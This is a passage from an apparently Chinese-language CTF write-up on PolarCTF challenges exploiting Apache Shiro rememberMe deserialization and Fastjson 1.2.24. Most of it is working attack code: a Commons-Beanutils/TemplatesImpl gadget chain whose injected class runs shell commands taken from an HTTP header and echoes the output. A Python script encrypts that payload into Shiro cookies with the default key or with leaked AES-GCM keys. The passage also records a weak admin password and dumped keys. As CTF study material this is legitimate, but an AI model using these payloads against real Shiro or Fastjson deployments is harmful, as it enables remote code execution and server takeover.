  queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;shiro_CB.txt&quot;</span>));<br>        oos.writeObject(queue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl <span class="hljs-title function_">getTemplate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">DynamicClassGenerator</span> <span class="hljs-variable">classGenerator</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicClassGenerator</span>();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> classGenerator.genPayloadForLinux();<br>        com.sun.org.apache.xalan.internal.xsltc.trax.<span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clz.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object fieldValue)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">classField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        classField.setAccessible(<span class="hljs-literal">true</span>);<br>        classField.set(obj, fieldValue);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>再用shiro550的python脚本跑一下就行了</p>
+<p>这里我贴个<code>pom.xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>polar<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.apache.org<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>cb<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="PolarOA2-0"><a href="#PolarOA2-0" class="headerlink" title="PolarOA2.0"></a>PolarOA2.0</h2><p>还是一样的后台 扫描器什么都没扫出来 不是默认密钥 有可能是把密钥改了 也有可能是高版本shiro随机生成密钥</p>
+<p>尝试弱口令 确实有 是admin:admin123</p>
+<p>登录进去什么都没有 首先考虑信息泄漏 SpringBoot actuator</p>
+<p>直接JDumpSpider一把梭</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">===========================================<br>CookieRememberMeManager(ShiroKey)<br>-------------<br>algMode = GCM, key = cLPlJTh9kHAPtGaU+CtGZw==, algName = AES<br>algMode = GCM, key = weMnS+A3kURXjtq/uEC4sA==, algName = AES<br><br>===========================================<br></code></pre></td></tr></table></figure>
+<p><img src="/img/polarctf/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>而且从<code>/actuator/logfile</code>system日志中知道了shiro版本1.8.0</p>
+<p>shiro1.8.0自带Commons-beanutils1.9.4 但是CB链照样能用</p>
+<p>盲猜一手Cookie字段限制 上面PolarOA1.0的时候其实还有可以优化的空间</p>
+<p>这里直接先给出payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro180</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        com.sun.org.apache.xalan.internal.xsltc.trax.<span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> getTemplate();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br>        <span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;shiro_CB_short.txt&quot;</span>));<br>        oos.writeObject(queue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass <span class="hljs-title function_">genPayloadForLinux</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public B() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br>        <span class="hljs-comment">// 兼容低版本jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl <span class="hljs-title function_">getTemplate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> genPayloadForLinux();<br>        com.sun.org.apache.xalan.internal.xsltc.trax.<span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clz.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object fieldValue)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">classField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        classField.setAccessible(<span class="hljs-literal">true</span>);<br>        classField.set(obj, fieldValue);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以看到 和之前对比的区别就在 这里直接把javassist加载类放在和序列化一起了 少了类的调用</p>
+<p>同时还删了windows平台的适配 然后能减少的字符串长度 变量长度等等都减小 其实应该还能再短 不过短一点也没什么意义了（</p>
+<p>由于shiro1.4.2之后用上了随机密钥 + AES-GCM加密 所以python脚本要改一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload</span>(<span class="hljs-params">command</span>):<br>    popen = subprocess.Popen([<span class="hljs-string">r&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">r&#x27;/Users/jednersaous/ysoserial-all.jar&#x27;</span>, <span class="hljs-string">&#x27;URLDNS&#x27;</span>, command],stdout=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> popen.stdout.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bin_read</span>(<span class="hljs-params">filepath</span>):<br>    f = <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&quot;rb&quot;</span>)<br>    <span class="hljs-keyword">return</span> f.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rememberMe</span>(<span class="hljs-params">plaintext</span>):<br>    key_raw = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>    <span class="hljs-comment"># shiro1.2.4 default key</span><br>    key = base64.b64decode(key_raw)<br><br>    iv = get_random_bytes(AES.block_size)<br><br>    plaintext_mod = pad(plaintext, AES.block_size)<br><br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br><br>    ciphertext = cipher.encrypt(plaintext_mod)<br>    ciphertext_str = base64.b64encode(iv + ciphertext).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> ciphertext_str<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rememberMe_GCM</span>(<span class="hljs-params">plaintext</span>):  <span class="hljs-comment"># no need for padding, plaintext has the same length as ciphertext</span><br>    key_raw = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input the base64 key: &quot;</span>)<br>    key = base64.b64decode(key_raw)<br><br>    iv = get_random_bytes(AES.block_size)<br><br>    cipher = AES.new(key, AES.MODE_GCM, iv)<br>    <br>    enc, tag = cipher.encrypt_and_digest(plaintext)<br>    ciphertext_str = base64.b64encode(iv + enc + tag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> ciphertext_str<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># payload = rememberMe(generate_payload(&quot;http://xa26wa.dnslog.cn&quot;))</span><br>    <span class="hljs-comment"># payload = rememberMe(bin_read(&quot;./tmp/shiro_CB.txt&quot;))</span><br>    payload = rememberMe_GCM(bin_read(<span class="hljs-string">&quot;./tmp/shiro_CB_short.txt&quot;</span>))<br><br>    <span class="hljs-comment"># result print</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] rememberMe_length: \n&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] rememberMe: \n&quot;</span> + payload)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/polarctf/2.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><p>fastjson1.2.24</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> BOOT-INF.classes.org.polarctf;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> org.polarctf.User;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonController</span> &#123;<br>  <span class="hljs-meta">@RequestMapping(value = &#123;&quot;/&quot;&#125;, method = &#123;RequestMethod.GET&#125;, produces = &#123;&quot;application/json;charset=UTF-8&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>    user.setName(<span class="hljs-string">&quot;Polar D&amp;N ~!&quot;</span>);<br>    user.setId(<span class="hljs-string">&quot;2022&quot;</span>);<br>    <span class="hljs-keyword">return</span> user;<br>  &#125;<br>  <br>  <span class="hljs-meta">@RequestMapping(value = &#123;&quot;/&quot;&#125;, method = &#123;RequestMethod.POST&#125;, produces = &#123;&quot;application/json;charset=UTF-8&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">setUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String jsonString)</span> &#123;<br>    System.out.println(jsonString);<br>    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Feature</span>[] &#123; Feature.SupportNonPublicField &#125;);<br>    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)jsonObject.toJavaObject(User.class);<br>    user.setId(<span class="hljs-string">&quot;2023&quot;</span>);<br>    <span class="hljs-keyword">return</span> user;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>给了<code>Feature.SupportNonPublicField</code> 那直接尝试TemplatesImpl链了</p>
